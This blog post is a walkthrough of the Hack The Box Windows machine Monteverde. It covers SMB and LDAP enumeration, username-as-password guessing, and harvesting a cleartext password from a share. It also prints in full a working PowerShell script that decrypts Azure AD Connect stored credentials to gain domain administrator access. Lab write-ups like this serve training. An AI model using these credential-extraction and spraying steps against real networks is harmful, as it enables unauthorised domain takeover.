---
title: "HackThebox: Monteverde Writeup"
date: 2020-07-22 23:18:44 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---

This is my writeup of the box Monteverde on Hack The Box. It's a Windows box with difficulty rating medium. 

![Monteverde Profile](https://jackhack.se/assets/images/monteverde/machine_profile.png)
{: .full}
# Recon 

Initial scanning with nmap as usual

~~~
kali@kali:~$ nmap -sC -sV -oA initial 10.10.10.172 -T5 
~~~


~~~
# Nmap 7.80 scan initiated Mon Jun  1 16:18:29 2020 as: nmap -sC -sV -oA initial 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.041s latency).
Scanned at 2020-06-01 16:18:30 EDT for 315s
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-01 19:32:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/1%Time=5ED562AB%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -46m33s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42256/tcp): CLEAN (Timeout)
|   Check 2 (port 2859/tcp): CLEAN (Timeout)
|   Check 3 (port 47166/udp): CLEAN (Timeout)
|   Check 4 (port 52281/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-01T19:34:35
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 16:23:45 2020 -- 1 IP address (1 host up) scanned in 315.71 seconds
~~~

Looks like mostly standard Active Directory ports, so i will run enum4linux to see if there is any interesting information to be recieved from smb/rpc, i will use the argument **-a** to do every basic enumeration (shares, users, groups etc.)

~~~
kali@kali:~$ enum4linux -a 10.10.10.172 
~~~
{: .language-bash}
Im mostly intrested in users to get an initial foothold on the machine:
~~~
 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
 ---snip---
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]q
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
---snip---
~~~

From here i tried to enumerate the SMB shares without credentials without luck, also enumerating the ldap service did not reveal any new information.

I began testing authenticating to the SMB shares with username:username credentials, with the argument **-L** to list shares.

~~~
smbclient -L 10.10.10.172 -U “username%username”

kali@kali:~$ smbclient -L 10.10.10.172 -U "SABatchJobs%SABatchJobs"

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	azure_uploads   Disk      
	C$              Disk      Default share
	E$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	users$          Disk      
~~~
{: .language-bash}
# User 
After listing the directories i went on connecting to and browsing the hidden Users share and downloaded the whole share trough smbclient

~~~
kali@kali:~$ smbclient //10.10.10.172/users$ -U “SABatchJobs%SABatchJobs”

smb:\> recurse on
smb:\> prompt off
smb:\> mget * 
~~~
{: .language-bash}

The above command downloaded the user mhope's directory, containing a file named azure.xml
When checking the file there is a cleartext password inside. 

![XML Credentials](https://jackhack.se/assets/images/monteverde/xml_creds.png)
{: .full}
Now i proceed to connect to the machine via evil-winrm with the recently found credentials & grabbed the *user.txt* flag.



~~~
root@kali:~$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
~~~
{: .language-bash}

# Root

Before starting the privilege escalation i want to know what permissions this user might have so i start by checking what groups this user is a member of.

~~~
PS C:\Users\mhope\Documents> Get-ADPrincipalGroupMembership mhope | Select name

---snip---
Azure Admins
---snip---
~~~
{: .language-powershell}
I quickly found out there was an ADSync folder,so this domain uses Azure Active Directory for its infrastructure.

XPN has a great [article](https://blog.xpnsec.com/azuread-connect-for-redteam/) on abusing Azure AD Connect & it's database for privilegie escalation, also containing a script for retrieving the username and password for the SQL-user (probably administrator :))

The script would not run for me and it was really confusing, but when i read it again i payed attention to the initial connection string, i found the site  [connectionstrings](https://www.connectionstrings.com/sql-server/) to browse for other possible connection strings.

### Full script with non-working connection string:
~~~powershell
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
~~~
{: .language-powershell}
### New connection string:
~~~
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
~~~
{: .language-powershell}

Despite from the changed connection string i pasted the entire script into a file named exploit.ps1 on my Kali box, uploaded it via evil-winrm and executed it.

~~~
*Evil-WinRM* PS C:\Users\mhope\Documents> upload exploit.ps1
*Evil-WinRM* PS C:\Users\mhope\Documents> .\exploit.ps1

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
~~~
{: .language-bash}

I disconnected from the current Evil-WinRM shell and connected again using the administrator account.

~~~
kali@kali:~$ evil-winrm -i 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'

~~~
{: .language-bash}
![Admin shell](https://jackhack.se/assets/images/monteverde/admin.png)
{: .full}


